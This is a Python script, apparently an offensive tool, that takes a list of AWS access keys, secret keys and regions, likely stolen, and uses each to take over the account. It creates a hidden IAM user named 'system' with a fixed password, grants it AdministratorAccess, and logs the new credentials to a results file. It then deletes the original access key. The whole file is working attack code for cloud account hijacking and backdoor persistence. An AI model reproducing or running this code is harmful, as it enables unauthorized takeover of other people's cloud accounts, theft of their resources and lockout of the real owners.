#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import time
import random
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Suppress only the single InsecureRequestWarning from urllib3 needed for requests
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def create_aws_user(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        print(f"{ACCESS_KEY} {SECRET_KEY} {REGION}")
        import boto3
        UsernameLogin = 'system'
        user = ACCESS_KEY
        keyacces = SECRET_KEY
        regionz = REGION
        client = boto3.client('iam', aws_access_key_id=user, aws_secret_access_key=keyacces, region_name=regionz)
        data = '[O][ACCOUNT]{}|{}|{}'.format(user, keyacces, regionz)
        Create_user = client.create_user(UserName=UsernameLogin)
        bitcg = f"User: {Create_user['User']['UserName']}"
        xxxxcc = f"User: {Create_user['User']['Arn']}"
        pws = 'BfJm5nNTBuvdw3rMUgzNTmFVtZpmgpPKnC8AzxWHbLZwupg44fS7RRbBMWrmqB58CDSVja4gNEjYem3BDteRvgpfExQheKuK24tv9Eh7atgFxjJW8x3Lz7df@@@'
        Buat = client.create_login_profile(Password=pws, PasswordResetRequired=False, UserName=UsernameLogin)
        Admin = client.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName=UsernameLogin)
        xxx = bitcg + '|' + UsernameLogin + '|' + pws + '|'
        remover = str(xxx).replace('r', '')
        with open('Result/IamAccount.txt', 'a') as simpan:
            simpan.write(remover + '\n')
        client.delete_access_key(AccessKeyId=user)
        print(Fore.GREEN + 'Success')
    except Exception as e:
        print(Fore.RED + 'Failed / AWS Can\'t Login or Access')
        print(Fore.RED + f'Error: {e}')

def main():
    filename = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Input List: ')
    if not os.path.exists(filename):
        print(f'{Fore.RED}The list not found in current dir{Style.RESET_ALL}')
        return
    
    with open(filename, 'r') as f:
        lines = f.read().splitlines()
        for line in lines:
            try:
                aws_access_key_id = re.findall("AWS_ACCESS_KEY_ID: (.*)", line)[0].strip()
                aws_secret_access_key = re.findall("AWS_SECRET_ACCESS_KEY: (.*)", line)[0].strip()
                aws_default_region = re.findall("AWS_DEFAULT_REGION: (.*)", line)[0].strip()
                create_aws_user(aws_access_key_id, aws_secret_access_key, aws_default_region)
            except Exception as e:
                print(Fore.RED + f'Error processing line: {line}')
                print(Fore.RED + f'Error: {e}')

if __name__ == '__main__':
    main()
